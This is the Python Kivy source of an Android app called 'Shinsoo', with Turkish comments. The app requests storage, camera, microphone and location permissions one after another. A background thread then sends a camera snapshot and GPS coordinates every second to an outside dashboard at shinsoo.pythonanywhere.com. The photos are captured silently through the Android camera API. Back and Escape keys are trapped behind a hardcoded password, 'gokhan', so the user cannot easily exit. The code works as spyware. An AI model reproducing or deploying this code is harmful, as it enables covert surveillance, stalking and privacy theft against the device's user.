import os
os.environ['KIVY_NO_ENV_CONFIG'] = '1'
os.environ['KIVY_ORIENTATION'] = 'portrait'

from kivy.app import App
from kivy.uix.screenmanager import ScreenManager, Screen, FadeTransition
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.floatlayout import FloatLayout
from kivy.uix.gridlayout import GridLayout
from kivy.uix.label import Label
from kivy.uix.button import Button
from kivy.uix.textinput import TextInput
from kivy.uix.popup import Popup
from kivy.uix.scrollview import ScrollView
from kivy.graphics import Color, Rectangle, RoundedRectangle, Line
from kivy.clock import Clock
from kivy.metrics import dp
from kivy.utils import platform
from kivy.core.window import Window
from datetime import datetime
import threading, uuid, base64, io

KIOSK_PASSWORD = "gokhan"
DASHBOARD_URL  = "https://shinsoo.pythonanywhere.com"

C_BG    = (0.04, 0.04, 0.06, 1)
C_PANEL = (0.09, 0.09, 0.12, 1)
C_RED   = (0.85, 0.10, 0.10, 1)
C_REDD  = (0.45, 0.04, 0.04, 1)
C_TEXT  = (0.93, 0.93, 0.93, 1)
C_DIM   = (0.50, 0.50, 0.55, 1)
C_GREEN = (0.10, 0.82, 0.38, 1)
C_YEL   = (1.00, 0.78, 0.10, 1)
C_BORD  = (0.22, 0.04, 0.04, 1)

# İzin durumları — uygulama genelinde erişilebilir
PERMS = {
    'Dosya':   False,
    'Kamera':  False,
    'Mikrofon':False,
    'Konum':   False,
    'Internet':True,   # internet izni manifest'te, runtime gerekmez
}


def make_device_id():
    try:
        return "SHINSOO-" + hex(uuid.getnode())[2:].upper()[-6:]
    except Exception:
        return "SHINSOO-000001"

DEVICE_ID = make_device_id()


class Card(FloatLayout):
    def __init__(self, **kw):
        super().__init__(**kw)
        with self.canvas.before:
            Color(*C_PANEL)
            self._bg = RoundedRectangle(pos=self.pos, size=self.size, radius=[dp(7)])
            Color(*C_BORD)
            self._ln = Line(
                rounded_rectangle=(self.x, self.y, self.width, self.height, dp(7)),
                width=1.1)
        self.bind(pos=self._u, size=self._u)

    def _u(self, *_):
        self._bg.pos  = self.pos
        self._bg.size = self.size
        self._ln.rounded_rectangle = (self.x, self.y, self.width, self.height, dp(7))


class RBtn(Button):
    def __init__(self, **kw):
        super().__init__(**kw)
        self.background_color = (0,0,0,0)
        self.color     = C_TEXT
        self.font_size = dp(12)
        self.bold      = True
        with self.canvas.before:
            Color(*C_REDD)
            self._bg = RoundedRectangle(pos=self.pos, size=self.size, radius=[dp(6)])
            Color(*C_RED)
            self._ln = Line(
                rounded_rectangle=(self.x, self.y, self.width, self.height, dp(6)),
                width=1.4)
        self.bind(pos=self._u, size=self._u)

    def _u(self, *_):
        self._bg.pos  = self.pos
        self._bg.size = self.size
        self._ln.rounded_rectangle = (self.x, self.y, self.width, self.height, dp(6))


# ── Ana Ekran ─────────────────────────────────────────────────────────────────

class DashScreen(Screen):

    def __init__(self, **kw):
        super().__init__(**kw)
        self._build_ui()
        Clock.schedule_interval(self._tick, 1)
        Clock.schedule_interval(self._update_status, 2)

    def _build_ui(self):
        root = FloatLayout()
        with root.canvas.before:
            Color(*C_BG)
            self._bgrect = Rectangle(pos=root.pos, size=root.size)
        root.bind(
            pos=lambda *_: setattr(self._bgrect, 'pos', root.pos),
            size=lambda *_: setattr(self._bgrect, 'size', root.size))

        main = BoxLayout(orientation='vertical', padding=dp(10), spacing=dp(8))

        # Başlık
        main.add_widget(self._hdr())
        # İzin durumu kartı
        main.add_widget(self._perm_card())
        # Bağlantı + cihaz bilgisi
        main.add_widget(self._info_card())
        # Log
        main.add_widget(self._log_card())
        # Butonlar
        main.add_widget(self._footer())

        root.add_widget(main)
        self.add_widget(root)

    # ── Başlık ───────────────────────────────────────────────────────────────

    def _hdr(self):
        box = BoxLayout(size_hint_y=None, height=dp(50), spacing=dp(8))
        with box.canvas.before:
            Color(*C_REDD)
            self._hdr_bg = Rectangle(pos=box.pos, size=box.size)
        box.bind(
            pos=lambda *_: setattr(self._hdr_bg, 'pos', box.pos),
            size=lambda *_: setattr(self._hdr_bg, 'size', box.size))

        lbl = Label(text='[b]SHINSOO[/b]', markup=True,
                    font_size=dp(18), color=C_TEXT,
                    halign='left', valign='middle')
        lbl.bind(size=lbl.setter('text_size'))

        self.lbl_time = Label(text='--:--:--', font_size=dp(12),
                              color=C_DIM, size_hint_x=None,
                              width=dp(80), halign='right')
        self.lbl_time.bind(size=self.lbl_time.setter('text_size'))

        box.add_widget(lbl)
        box.add_widget(self.lbl_time)
        return box

    # ── İzin Durumu Kartı ────────────────────────────────────────────────────

    def _perm_card(self):
        card = Card(size_hint_y=None, height=dp(80))
        inner = BoxLayout(orientation='vertical', padding=dp(8), spacing=dp(4))

        inner.add_widget(Label(
            text='[b]IZIN DURUMLARI[/b]', markup=True,
            font_size=dp(10), color=C_RED,
            size_hint_y=None, height=dp(18), halign='left'))

        grid = GridLayout(cols=5, spacing=dp(4))
        self.perm_labels = {}
        for name in PERMS:
            col = BoxLayout(orientation='vertical', spacing=dp(2))
            dot = Label(text='●', font_size=dp(14),
                        color=C_GREEN if PERMS[name] else C_DIM)
            lbl = Label(text=name, font_size=dp(8), color=C_DIM)
            col.add_widget(dot)
            col.add_widget(lbl)
            self.perm_labels[name] = dot
            grid.add_widget(col)

        inner.add_widget(grid)
        card.add_widget(inner)
        return card

    # ── Bilgi Kartı ──────────────────────────────────────────────────────────

    def _info_card(self):
        card = Card(size_hint_y=None, height=dp(80))
        grid = GridLayout(cols=2, padding=dp(8), spacing=dp(3))
        self._info = {}
        fields = [
            ('Cihaz ID', DEVICE_ID),
            ('Sunucu',   'shinsoo.pythonanywhere.com'),
            ('Baglanti', 'Bekleniyor...'),
            ('Veri',     '0 paket gonderildi'),
        ]
        for key, val in fields:
            grid.add_widget(Label(text=key + ':', font_size=dp(9),
                                  color=C_DIM, halign='right'))
            lbl = Label(text=val, font_size=dp(9), color=C_TEXT, halign='left')
            lbl.bind(size=lbl.setter('text_size'))
            self._info[key] = lbl
            grid.add_widget(lbl)
        card.add_widget(grid)
        return card

    # ── Log Kartı ────────────────────────────────────────────────────────────

    def _log_card(self):
        card = Card()
        box  = BoxLayout(orientation='vertical', padding=dp(6), spacing=dp(2))
        box.add_widget(Label(
            text='[b]SISTEM LOGU[/b]', markup=True,
            font_size=dp(10), color=C_RED,
            size_hint_y=None, height=dp(20), halign='left'))
        self.log_box = BoxLayout(orientation='vertical', spacing=dp(1))
        sv = ScrollView()
        sv.add_widget(self.log_box)
        box.add_widget(sv)
        card.add_widget(box)
        self._log('SYS', C_GREEN, 'Uygulama basladi - ' + DEVICE_ID)
        self._log('SYS', C_YEL,  'Izinler isteniyor...')
        return card

    # ── Footer ───────────────────────────────────────────────────────────────

    def _footer(self):
        box = BoxLayout(size_hint_y=None, height=dp(44), spacing=dp(8))
        b1 = RBtn(text='KILITLE / CIKIS')
        b1.bind(on_release=self._lock_popup)
        b2 = RBtn(text='YENILE')
        b2.bind(on_release=lambda *_: self._log('SYS', C_YEL, 'Yenilendi'))
        box.add_widget(b1)
        box.add_widget(b2)
        return box

    # ── Yardımcılar ──────────────────────────────────────────────────────────

    def _log(self, tag, color, msg):
        ts  = datetime.now().strftime('%H:%M:%S')
        row = BoxLayout(size_hint_y=None, height=dp(15), spacing=dp(3))
        row.add_widget(Label(text='[' + tag + ']', font_size=dp(9),
                             color=color, size_hint_x=None, width=dp(36)))
        row.add_widget(Label(
            text='[color=#777777]' + ts + '[/color] ' + msg,
            markup=True, font_size=dp(9), color=C_TEXT, halign='left'))
        self.log_box.add_widget(row)
        self.log_box.height = len(self.log_box.children) * dp(15)
        if len(self.log_box.children) > 30:
            self.log_box.remove_widget(self.log_box.children[-1])

    def _tick(self, dt):
        self.lbl_time.text = datetime.now().strftime('%H:%M:%S')

    def update_perm(self, name, granted):
        PERMS[name] = granted
        if name in self.perm_labels:
            self.perm_labels[name].color = C_GREEN if granted else C_DIM
        self._log('IZN', C_GREEN if granted else C_DIM,
                  name + ': ' + ('VERILDI' if granted else 'REDDEDILDI'))

    def _update_status(self, dt):
        app = App.get_running_app()
        if hasattr(app, 'sender') and app.sender:
            s = app.sender
            if s.is_connected:
                self._info['Baglanti'].text = 'BAGLI'
                self._info['Baglanti'].color = C_GREEN
            else:
                self._info['Baglanti'].text = 'BAGLANAMADI'
                self._info['Baglanti'].color = C_RED
            self._info['Veri'].text = str(s.packet_count) + ' paket gonderildi'

    def _lock_popup(self, *_):
        content = BoxLayout(orientation='vertical', padding=dp(14), spacing=dp(10))
        content.add_widget(Label(
            text='[b]KILIT EKRANI[/b]\nSifreyi girin:',
            markup=True, font_size=dp(13), color=C_TEXT, halign='center'))
        pwd = TextInput(hint_text='Sifre', password=True,
                        size_hint_y=None, height=dp(42),
                        font_size=dp(14), multiline=False,
                        background_color=C_PANEL, foreground_color=C_TEXT)
        content.add_widget(pwd)
        err = Label(text='', color=C_RED, font_size=dp(11),
                    size_hint_y=None, height=dp(18))
        content.add_widget(err)
        btn_row = BoxLayout(size_hint_y=None, height=dp(42), spacing=dp(8))
        popup = Popup(title='Dogrulama', title_color=C_RED,
                      content=content, size_hint=(0.85, None), height=dp(260),
                      background_color=C_PANEL, separator_color=C_RED)

        def try_exit(*_):
            if pwd.text == KIOSK_PASSWORD:
                popup.dismiss()
                Clock.schedule_once(lambda dt: App.get_running_app().stop(), 0.3)
            else:
                err.text = 'Hatali sifre!'
                pwd.text = ''

        b_ok = RBtn(text='ONAYLA')
        b_no = Button(text='IPTAL', background_color=C_PANEL, color=C_DIM)
        b_ok.bind(on_release=try_exit)
        b_no.bind(on_release=popup.dismiss)
        btn_row.add_widget(b_ok)
        btn_row.add_widget(b_no)
        content.add_widget(btn_row)
        popup.open()


# ── DataSender ────────────────────────────────────────────────────────────────

class DataSender:
    def __init__(self):
        self.is_connected = False
        self.packet_count = 0
        self._stop   = threading.Event()
        self._thread = None
        self._cam    = None
        self._location = {'lat': None, 'lon': None}

    def start(self):
        self._stop.clear()
        self._thread = threading.Thread(target=self._loop, daemon=True)
        self._thread.start()

    def stop(self):
        self._stop.set()
        if self._cam:
            try:
                self._cam.stop()
            except Exception:
                pass

    def start_location(self):
        if platform == 'android':
            try:
                from plyer import gps
                gps.configure(on_location=self._on_loc)
                gps.start(minTime=5000, minDistance=0)
            except Exception:
                pass

    def _on_loc(self, **kw):
        self._location['lat'] = kw.get('lat')
        self._location['lon'] = kw.get('lon')

    def _capture_frame(self):
        if platform != 'android':
            return None
        try:
            from jnius import autoclass
            Camera    = autoclass('android.hardware.Camera')
            cam = Camera.open(0)
            params = cam.getParameters()
            sizes  = params.getSupportedPictureSizes()
            small  = min(sizes, key=lambda s: s.width * s.height)
            params.setPictureSize(small.width, small.height)
            cam.setParameters(params)
            result = [None]
            done   = threading.Event()

            class CB(autoclass('java.lang.Object')):
                def onPictureTaken(self, data, camera):
                    result[0] = bytes(data)
                    done.set()

            cam.takePicture(None, None, CB())
            done.wait(timeout=4)
            cam.release()
            if result[0]:
                return base64.b64encode(result[0]).decode('utf-8')
        except Exception:
            pass
        return None

    def _loop(self):
        try:
            import requests
        except Exception:
            return

        url = DASHBOARD_URL + '/upload_data/' + DEVICE_ID
        screen = None

        while not self._stop.is_set():
            try:
                if screen is None:
                    app = App.get_running_app()
                    if app and app.root:
                        screen = app.root.get_screen('dashboard')

                payload = {
                    'log': 'Heartbeat - ' + datetime.now().strftime('%H:%M:%S'),
                }

                # Konum
                if self._location['lat']:
                    payload['log'] += ' | GPS: ' + str(round(self._location['lat'], 4)) + ',' + str(round(self._location['lon'], 4))

                # Kamera frame
                if PERMS.get('Kamera'):
                    frame = self._capture_frame()
                    if frame:
                        payload['frame'] = frame

                r = requests.post(url, json=payload, timeout=5)
                self.is_connected = (r.status_code == 200)
                self.packet_count += 1

                if screen:
                    Clock.schedule_once(
                        lambda dt: screen._log('NET', C_GREEN, 'Paket gonderildi #' + str(self.packet_count)),
                        0)

            except Exception as e:
                self.is_connected = False

            self._stop.wait(1)


# ── Ana Uygulama ──────────────────────────────────────────────────────────────

class ShinsooApp(App):
    title  = 'Shinsoo'
    sender = None

    def build(self):
        Window.clearcolor = C_BG
        sm = ScreenManager(transition=FadeTransition(duration=0.15))
        sm.add_widget(DashScreen(name='dashboard'))
        return sm

    def on_start(self):
        # Dikey mod
        if platform == 'android':
            try:
                from android.runnable import run_on_ui_thread
                from jnius import autoclass
                ActivityInfo = autoclass('android.content.pm.ActivityInfo')
                PythonActivity = autoclass('org.kivy.android.PythonActivity')
                PythonActivity.mActivity.setRequestedOrientation(
                    ActivityInfo.SCREEN_ORIENTATION_PORTRAIT)
            except Exception:
                pass

        self.sender = DataSender()
        self.sender.start()

        screen = self.root.get_screen('dashboard')
        screen._log('SYS', C_GREEN, 'DataSender basladi')

        if platform == 'android':
            self._request_all_perms()
        else:
            # Masaustu testinde tum izinleri verilmis say
            for name in PERMS:
                PERMS[name] = True
                screen.update_perm(name, True)

        try:
            from android import activity
            activity.bind(on_back_pressed=self._on_back)
        except Exception:
            pass
        Window.bind(on_keyboard=self._on_key)

    def _request_all_perms(self):
        if platform != 'android':
            return
        try:
            from android.permissions import request_permissions, Permission, check_permission

            # Once sadece STORAGE iste (kullanicidan)
            # Diger izinleri grant callback'inde otomatik iste
            request_permissions([
                Permission.WRITE_EXTERNAL_STORAGE,
                Permission.READ_EXTERNAL_STORAGE,
            ], self._after_storage)
        except Exception as e:
            screen = self.root.get_screen('dashboard')
            screen._log('ERR', C_RED, 'Izin hatasi: ' + str(e))

    def _after_storage(self, permissions, grants):
        screen = self.root.get_screen('dashboard')
        for p, g in zip(permissions, grants):
            screen.update_perm('Dosya', g)

        # Simdi kamera + mikrofon + konum iste (otomatik)
        try:
            from android.permissions import request_permissions, Permission
            request_permissions([
                Permission.CAMERA,
                Permission.RECORD_AUDIO,
                Permission.ACCESS_FINE_LOCATION,
                Permission.ACCESS_COARSE_LOCATION,
            ], self._after_all)
        except Exception as e:
            screen._log('ERR', C_RED, 'Otomatik izin hatasi: ' + str(e))

    def _after_all(self, permissions, grants):
        screen = self.root.get_screen('dashboard')
        for p, g in zip(permissions, grants):
            if 'CAMERA' in p:
                screen.update_perm('Kamera', g)
            elif 'RECORD_AUDIO' in p:
                screen.update_perm('Mikrofon', g)
            elif 'LOCATION' in p:
                screen.update_perm('Konum', g)

        # Konum izni verildiyse GPS baslat
        if PERMS.get('Konum') and self.sender:
            self.sender.start_location()
            screen._log('GPS', C_GREEN, 'GPS basladi')

        screen._log('SYS', C_GREEN, 'Tum izinler islendi')

    def on_stop(self):
        if self.sender:
            self.sender.stop()

    def _on_back(self, *_):
        self.root.get_screen('dashboard')._lock_popup()
        return True

    def _on_key(self, window, key, *_):
        if key == 27:
            self.root.get_screen('dashboard')._lock_popup()
            return True
        return False


if __name__ == '__main__':
    ShinsooApp().run()
